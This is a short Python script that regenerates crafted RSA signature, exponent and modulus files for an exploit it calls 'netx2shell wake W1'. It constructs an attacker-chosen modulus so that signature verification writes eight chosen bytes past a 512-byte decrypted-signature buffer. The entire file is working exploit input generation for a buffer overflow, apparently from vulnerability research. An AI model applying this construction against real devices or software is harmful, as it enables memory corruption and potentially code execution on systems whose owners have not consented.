#!/usr/bin/env python3
"""Regenerate the chosen-byte RSA inputs used in netx2shell wake W1.

Construction: pick a 512-byte signature s and a fully chosen 1024-byte output
T, then set the attacker-controlled 8192-bit modulus to n = s^2 - T. Because
T < n, s^2 mod n == T exactly, so the vulnerable huge-number extract writes
the chosen bytes T into the 512-byte decrypted_signature destination.
"""
from pathlib import Path

HERE = Path(__file__).resolve().parent

S = bytes([0x40]) + bytes([0xFF]) * 511          # 4095-bit signature
EXP = bytes([0x00, 0x00, 0x02])                  # public exponent e = 2

for tag, chosen in (("A", bytes.fromhex("deadbeefcafebabe")),
                    ("B", bytes.fromhex("5aadbeefcafebabe"))):
    T = bytearray(1024)
    T[0] = 0x01                                   # full 1024-byte magnitude
    T[512:520] = chosen                           # 8 chosen bytes past the buffer
    n = int.from_bytes(S, "big") ** 2 - int.from_bytes(T, "big")
    assert n > 0 and n.bit_length() <= 8192
    nbytes = n.to_bytes(1024, "big")
    assert nbytes[0] != 0
    assert (int.from_bytes(S, "big") ** 2) % n == int.from_bytes(T, "big")
    out = HERE / ("" if tag == "A" else "b")
    out.mkdir(exist_ok=True)
    (out / "sig.bin").write_bytes(S)
    (out / "exp.bin").write_bytes(EXP)
    (out / "mod.bin").write_bytes(nbytes)
    print(f"{tag}: modulus bits={n.bit_length()} chosen bytes at 512..519 = {chosen.hex()}")
